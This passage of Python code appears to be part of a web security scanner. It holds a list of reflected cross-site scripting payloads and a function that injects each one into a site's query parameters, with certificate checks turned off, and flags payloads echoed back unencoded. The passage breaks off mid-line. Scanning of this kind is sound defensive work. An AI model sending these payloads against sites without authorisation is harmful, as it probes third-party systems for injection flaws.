import requests
import urllib.parse

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "\"><img src=x onerror=alert('XSS')>",
]

def check_xss(url, session=None):
    findings = []
    s = session or requests.Session()

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    test_params = list(params.keys()) if params else ["search", "q", "query", "name", "input", "term"]

    for param in test_params:
        for payload in XSS_PAYLOADS:
            test_url = f"{url.split('?')[0]}?{param}={urllib.parse.quote(payload)}"
            try:
                r = s.get(test_url, timeout=10, verify=False)
                # Check if payload is reflected in response unencoded
                if payload in r.text:
                    findings.append({
                        "check": "Reflected XSS",
                        "severity": "HIGH",
                        "detail": f"XSS payload reflected unencoded in response via parameter '{param}'.",
                        "evidence": f"Payload '{payload}' reflected in response fro